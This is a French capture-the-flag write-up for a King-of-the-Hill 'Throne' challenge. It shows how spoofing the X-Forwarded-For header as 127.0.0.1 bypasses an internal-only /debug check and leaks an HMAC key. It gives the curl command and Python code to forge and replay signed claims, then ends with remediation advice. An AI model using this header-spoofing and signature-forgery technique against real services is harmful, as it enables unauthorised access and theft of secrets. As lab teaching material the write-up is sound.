# KOTH Throne — X-Forwarded-For bypass fuit la clé HMAC

> 📖 **Public write-up by [alwil17](https://github.com/Alwil17)** — originally published at <https://alwil17.github.io/ctf-writeups/posts/koth-throne/>  
> Source: <https://github.com/Alwil17/ctf-writeups> · MIT License, © 2026 alwil17 (see `THIRD_PARTY_LICENSES/alwil17-ctf-writeups.LICENSE`). Front matter removed, article body unmodified.

> **TL;DR** — Le contrôle « interne uniquement » de l'endpoint `/debug` repose
> sur un header `X-Forwarded-For` spoofable, pas sur l'IP réelle de la
> connexion. En l'usurpant à `127.0.0.1`, on fuit la clé HMAC qui signe les
> revendications du trône, puis on signe les siennes et on tient le trône en
> rejouant la revendication en boucle.


## 1. Briefing
Service « Throne » (KOTH), serveur HTTP Python custom. Le scoring récompense qui
tient le trône le plus longtemps.

| Élément | Valeur |
|---------|--------|
| Cible | `http://<host>:28490` (instance éphémère) |
| Scoring | `POST /throne` avec `{team, ts, sig}` signé HMAC |

## 2. Reconnaissance

```
GET /  → protocole : POST /throne {"team","ts","sig"}
         "Ops tooling lives on the internal-only /debug"
GET /debug → 403 {"error":"debug endpoint is internal only"}
```

## 3. Analyse
Le filtre « internal only » lit `X-Forwarded-For` — un header fourni par le
client — au lieu de l'adresse source réelle de la socket TCP. Il est donc
trivialement contournable.

## 4. Exploitation

### Fuite de la clé HMAC

```bash
curl -H "X-Forwarded-For: 127.0.0.1" http://<host>:28490/debug
# {"note":"ops diagnostics",
#  "hill_key":"<HILL_KEY>",
#  "sig_scheme":"HMAC_SHA1(HILL_KEY, team + '|' + ts)",
#  "skew_seconds":45}
```

### Signer et revendiquer le trône

```python
import hmac, hashlib, time
key  = b'<HILL_KEY>'            # fuité via /debug
team = '<team-token>'           # jeton d'équipe pour ce node
ts   = int(time.time())
sig  = hmac.new(key, f'{team}|{ts}'.encode(), hashlib.sha1).hexdigest()
# POST /throne {"team": team, "ts": ts, "sig": sig} → {"ok": true, "king": "..."}
```

La revendication expire au bout d'une minute (`skew_seconds`), donc elle est
rejouée toutes les ~25 s en tâche de fond pour conserver le trône
(5 pts / tick de 30 s).

## 5. Leçons & remédiation
| Faiblesse | Cause racine | Correctif |
|-----------|--------------|-----------|
| Contournement d'accès | Confiance en `X-Forwarded-For` client | Décider l'accès à partir de l'IP réelle de la socket ; n'accepter `XFF` que d'un proxy de confiance |
| Clé exposée | Endpoint de debug qui divulgue la clé de signature | Jamais de secret renvoyé par une API ; séparer debug et production |
